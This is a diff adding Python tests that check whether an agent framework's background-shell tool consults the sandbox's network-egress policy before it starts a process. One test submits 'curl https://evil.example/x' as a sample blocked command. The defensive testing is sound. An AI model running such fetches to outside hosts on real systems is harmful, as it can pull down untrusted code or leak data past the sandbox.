@@ -141,6 +141,67 @@ class TestToolsIntegration:
         result = await check_background_shell("nope", _deps={"background_shell_manager": manager})
         assert result.startswith("Error: no background job")
 
+    async def test_network_policy_gate_consulted_before_start(self):
+        # P1: submit must gate the LAUNCH command through sandbox.network_allowed
+        # -- the live process then runs outside the per-call pipeline for its
+        # whole lifetime, so this is the single enforcement point for egress tiers.
+        class SpySandbox:
+            def __init__(self) -> None:
+                self.calls = 0
+
+            def validate_path(self, path):
+                return path
+
+            def build_env(self, cfg=None):
+                return {"PATH": "/usr/bin"}
+
+            def network_allowed(self, command):
+                self.calls += 1
+                return False  # deny all egress
+
+        spy = SpySandbox()
+        manager = BackgroundShellManager()
+        result = await submit_background_shell(
+            "curl https://evil.example/x",
+            _deps={"sandbox": spy, "background_shell_manager": manager},
+        )
+        assert result.startswith("Error: command blocked by sandbox network policy")
+        assert spy.calls == 1, "submit must consult sandbox.network_allowed before starting"
+
+    async def test_starts_when_sandbox_permits_network(self):
+        class PermissiveSandbox:
+            def validate_path(self, path):
+                return path
+
+            def build_env(self, cfg=None):
+                return None
+
+            def network_allowed(self, command):
+                return True
+
+        manager = BackgroundShellManager()
+        result = await submit_background_shell(
+            "echo hi", _deps={"sandbox": PermissiveSandbox(), "background_shell_manager": manager}
+        )
+        assert result.startswith("Background job started")
+        await manager.kill_all()
+
+    async def test_sandbox_without_network_allowed_attr_not_gated(self):
+        # A sandbox with no network_allowed attr (e.g. passthrough) is not gated.
+        class BareSandbox:
+            def validate_path(self, path):
+                return path
+
+            def build_env(self, cfg=None):
+                return None
+
+        manager = BackgroundShellManager()
+        result = await submit_background_shell(
+            "echo hi", _deps={"sandbox": BareSandbox(), "background_shell_manager": manager}
+        )
+        assert result.startswith("Background job started")
+        await manager.kill_all()
+
 
 class TestRiskLevelsAndIdempotency:
     def test_submit_is_destructive_non_idempotent(self):
